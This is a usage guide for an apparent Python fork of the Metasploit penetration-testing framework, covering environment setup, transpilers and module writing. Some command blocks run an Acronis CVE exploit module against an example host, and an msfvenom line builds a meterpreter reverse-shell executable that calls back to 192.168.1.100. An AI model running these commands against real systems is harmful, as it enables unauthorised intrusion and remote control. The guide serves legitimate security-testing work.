# Metasploit Framework Usage Guide

This guide explains how to use the Metasploit Framework. **The recommended method for this fork is to use `source msfrc`** which provides a Python virtualenv-like experience.

## Quick Start

### ✅ Recommended: Python-Native Experience with `source msfrc`

**This is the preferred and recommended way to use this fork of Metasploit Framework.**

Activate the Metasploit environment in your shell (similar to Python virtualenv):

```bash
# Activate MSF environment
source msfrc

# Now all MSF commands are available in your shell
msf_console    # Python-enhanced console
msf_venom      # Payload generator
msf_exploit    # Quick exploit launcher
msf_search     # Search modules
msf_info       # Show environment info
msf_db         # Database management
msf_rpc        # RPC server

# Run Python exploit modules directly
python3 modules/exploits/linux/http/example.py --help

# Use transpiler tools
python3 ruby2py/convert.py old_module.rb
python3 ruby2py/py2ruby/transpiler.py new_module.py -o output.rb

# Deactivate when done
msf_deactivate
```

**Why this method is better:**
- 🚀 Modern workflow similar to Python virtualenv
- 🐍 Python-native with proper environment configuration
- 💻 All commands available directly in your shell
- 🔧 Easy access to tools and utilities
- 📦 Automatic path and environment setup
- 🧹 Clean deactivation restores your shell

### ⚠️ Legacy: Classic Console Experience

If you try to run `msfconsole` directly, you will be guided to use the recommended `source msfrc` method instead.

The classic console approach is being phased out in this fork. For traditional Metasploit usage:

```bash
# This will show you a message to use 'source msfrc' instead
./msfconsole
```

For documentation on the original Metasploit console:
- Visit the [Using Metasploit](https://docs.metasploit.com/docs/using-metasploit/getting-started/index.html) section

## Python-Native Workflow

### Running Exploit Modules

```bash
# Activate environment
source msfrc

# Run exploit with help
python3 modules/exploits/linux/http/acronis_cyber_infra_cve_2023_45249.py --help

# Run vulnerability check
python3 modules/exploits/linux/http/acronis_cyber_infra_cve_2023_45249.py \
    --host 192.168.1.100 --check-only --verbose

# Execute exploit
python3 modules/exploits/linux/http/acronis_cyber_infra_cve_2023_45249.py \
    --host 192.168.1.100 --target 1 --ssl --verbose
```

### Using Transpilers

#### Ruby to Python

Convert legacy Ruby modules to Python:

```bash
# Convert single file
python3 transpilers/ruby2py/converter.py \
    modules/exploits/windows/smb/old_exploit.rb

# Convert with custom output
python3 transpilers/ruby2py/converter.py \
    input.rb -o output.py

# Batch convert directory (coming soon)
python3 transpilers/ruby2py/converter.py \
    modules/exploits/linux/http/ --recursive
```

#### Python to Ruby

Convert Python modules to Ruby for compatibility:

```bash
# Convert single file
python3 transpilers/py2ruby/transpiler.py \
    new_exploit.py -o output.rb

# With verbose output
python3 transpilers/py2ruby/transpiler.py \
    new_exploit.py -o output.rb --verbose
```

## Configuration

### Environment Variables

When using `source msfrc`, these variables are automatically set:

- `MSF_ROOT` - Metasploit installation directory
- `MSF_DATABASE_CONFIG` - Database configuration file
- `MSF_MODULE_PATHS` - Module search paths
- `MSF_PLUGIN_PATH` - Plugin directory
- `MSF_DATA_ROOT` - Data directory
- `PYTHONPATH` - Python module paths

### Python Configuration

Configuration files are in `config/`:

- `config/boot.py` - Boot configuration and path setup
- `config/application.py` - Application configuration
- `config/environment.py` - Environment initialization

Test configuration:

```bash
python3 test_configuration.py
```

## Development

### Writing New Modules

#### Python Module (Recommended)

```python
from python_framework.core.exploit import RemoteExploit, ExploitInfo, ExploitResult
from python_framework.helpers.http_client import HttpExploitMixin

class MyExploit(RemoteExploit, HttpExploitMixin):
    def __init__(self):
        info = ExploitInfo(
            name="My Exploit",
            description="Exploit description",
            author=["Your Name"],
            references=["CVE-2024-XXXXX"],
            rank=ExploitRank.EXCELLENT
        )
        super().__init__(info)
    
    def check(self) -> ExploitResult:
        response = self.http_get('/vulnerable_endpoint')
        if response and response.status_code == 200:
            return ExploitResult(True, "Target is vulnerable")
        return ExploitResult(False, "Target is not vulnerable")
    
    def exploit(self) -> ExploitResult:
        # Your exploitation code here
        payload = self.generate_payload()
        response = self.http_post('/exploit', data={'cmd': payload})
        
        if response and response.status_code == 200:
            return ExploitResult(True, "Exploitation successful")
        return ExploitResult(False, "Exploitation failed")

if __name__ == '__main__':
    exploit = MyExploit()
    exploit.run_from_cli()
```

### Converting Existing Modules

Use the transpiler to convert Ruby modules:

```bash
# Convert Ruby module to Python
python3 transpilers/ruby2py/converter.py \
    modules/exploits/windows/smb/ms17_010_eternalblue.rb

# Review and test the output
python3 modules/exploits/windows/smb/ms17_010_eternalblue.py --help
```

## Classic MSF Commands

All classic MSF commands work as before:

### msfconsole

```bash
./msfconsole                 # Start console
./msfconsole -q              # Quiet mode (no banner)
./msfconsole -r script.rc    # Run resource script
```

### msfvenom

```bash
./msfvenom -l payloads       # List payloads
./msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
```

### msfd

```bash
./msfd                       # Start daemon (foreground)
./msfd -f                    # Foreground mode
./msfd -a 0.0.0.0 -p 55554   # Bind to all interfaces
```

### msfdb

```bash
./msfdb init                 # Initialize database
./msfdb start                # Start database
./msfdb stop                 # Stop database
./msfdb status               # Check status
```

## Documentation

### Primary Resources

- **Main Documentation**: https://docs.metasploit.com/
- **Python Migration**: [PYTHON_MIGRATION_README.md](PYTHON_MIGRATION_README.md)
- **Python Quickstart**: [PYTHON_QUICKSTART.md](PYTHON_QUICKSTART.md)
- **Exploit Writing**: [documentation/EXPLOIT_WRITING_GUIDE.md](documentation/EXPLOIT_WRITING_GUIDE.md)
- **Transpiler Guide**: [transpilers/README.md](transpilers/README.md)

### Additional Guides

- **PF Integration**: [documentation/PF_INTEGRATION_GUIDE.md](documentation/PF_INTEGRATION_GUIDE.md)
- **C2 Frameworks**: [documentation/SHELL_CATCHER_C2_GUIDE.md](documentation/SHELL_CATCHER_C2_GUIDE.md)
- **Module Categorization**: [documentation/MODULE_CATEGORIZATION.md](documentation/MODULE_CATEGORIZATION.md)

## Troubleshooting

### Configuration Issues

```bash
# Test configuration
python3 test_configuration.py

# Check environment
source msfrc
echo $MSF_ROOT
```

### Module Issues

```bash
# Check Python syntax
python3 -m py_compile modules/exploits/path/to/module.py

# Run with debug output
python3 modules/exploits/path/to/module.py --verbose
```

### Transpiler Issues

```bash
# Test transpiler
python3 transpilers/ruby2py/converter.py --help
python3 transpilers/py2ruby/transpiler.py --help

# Validate output
python3 -m py_compile output.py
ruby -c output.rb
```

## Getting Help

- **GitHub Discussions**: https://github.com/rapid7/metasploit-framework/discussions
- **Metasploit Slack**: https://metasploit.com/slack
- **GitHub Issues**: https://github.com/rapid7/metasploit-framework/issues

## Contributing

When contributing modules:

1. **New modules**: Write in Python (preferred)
2. **Legacy modules**: Use transpiler for conversion
3. **Test thoroughly**: Verify functionality
4. **Follow guidelines**: See [CONTRIBUTING.md](CONTRIBUTING.md)

## License

Metasploit Framework is released under a BSD-style license. See [COPYING](COPYING) for details.
